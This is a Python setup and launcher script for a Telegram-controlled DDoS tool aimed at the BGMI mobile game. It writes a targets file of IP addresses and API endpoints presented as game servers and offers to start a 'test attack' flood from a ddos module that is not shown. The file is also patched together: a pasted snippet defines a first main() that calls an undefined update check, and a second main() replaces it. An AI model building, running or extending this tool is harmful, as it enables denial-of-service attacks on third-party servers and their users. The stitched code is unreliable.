#!/usr/bin/env python3
def main():
    # ADD THIS AT THE VERY START
    def check_updates_on_start():
        try:
            update_needed, new_version = check_update()
            if update_needed:
                print(f"\n{'='*50}")
                print(f"[!] UPDATE AVAILABLE: {new_version}")
                print(f"[!] Run: python3 updater.py")
                print(f"[!] Or use /update in Telegram")
                print(f"{'='*50}\n")
        except:
            pass
    
    # Call it
    check_updates_on_start()
    
    # Rest of your existing code...
    print_banner()
    setup_config()
    # ... etc

import os
import sys
import json
import subprocess
from colorama import init, Fore

init(autoreset=True)

def print_banner():
    banner = f"""
{Fore.RED}
╔══════════════════════════════════════╗
║                                      ║
║     {Fore.WHITE}BGMI SERVER DDoS TOOL{Fore.RED}          ║
║         {Fore.YELLOW}TELEGRAM BOT EDITION{Fore.RED}      ║
║                                      ║
╚══════════════════════════════════════╝
{Fore.RESET}
    """
    print(banner)

def setup_config():
    """Create configuration files"""
    if not os.path.exists('config.json'):
        config = {
            "telegram_token": "YOUR_BOT_TOKEN_HERE",
            "admin_ids": [123456789],  # Your Telegram ID
            "max_threads": 1000,
            "auto_start": False
        }
        
        with open('config.json', 'w') as f:
            json.dump(config, f, indent=4)
        
        print(f"{Fore.YELLOW}[!] Created config.json - Edit with your Telegram bot token")
    
    if not os.path.exists('targets.json'):
        targets = {
            "bgmi_servers": [
                {"ip": "45.76.156.194", "region": "Asia", "port": 80},
                {"ip": "103.21.244.0", "region": "India", "port": 80},
                {"ip": "103.22.200.0", "region": "Middle East", "port": 80},
                {"ip": "45.76.156.195", "region": "Europe", "port": 80},
                {"ip": "45.32.100.25", "region": "North America", "port": 80},
                {"ip": "45.76.156.196", "region": "South America", "port": 80}
            ],
            "api_endpoints": [
                "https://api.pubg.com",
                "https://bgmi.krafton.com",
                "https://game-server.bgmi.com"
            ]
        }
        
        with open('targets.json', 'w') as f:
            json.dump(targets, f, indent=4)

def install_dependencies():
    """Install required packages"""
    print(f"{Fore.CYAN}[*] Installing dependencies...")
    
    requirements = [
        "pyTelegramBotAPI",
        "requests",
        "colorama"
    ]
    
    for package in requirements:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])
            print(f"{Fore.GREEN}[+] Installed {package}")
        except:
            print(f"{Fore.RED}[-] Failed to install {package}")

def main():
    print_banner()
    
    # Setup
    setup_config()
    
    # Check dependencies
    try:
        import telebot
        import requests
        from colorama import init
    except ImportError:
        print(f"{Fore.RED}[!] Missing dependencies!")
        install_dependencies()
    
    print(f"\n{Fore.GREEN}[+] Setup complete!")
    print(f"{Fore.CYAN}[*] Edit config.json with your Telegram bot token")
    print(f"{Fore.CYAN}[*] Run the bot with: python bot.py")
    print(f"{Fore.CYAN}[*] Or test DDoS with: python ddos.py")
    
    # Quick test option
    print(f"\n{Fore.YELLOW}[?] Quick test DDoS? (y/n): ", end="")
    choice = input().lower()
    
    if choice == 'y':
        from ddos import BGMIDDOS
        ddos = BGMIDDOS()
        print(f"{Fore.RED}[!] Starting test attack (10 seconds)...")
        ddos.start_attack("tcp", threads=50, duration=10)
        print(f"{Fore.GREEN}[+] Test complete!")

if __name__ == "__main__":
    main()
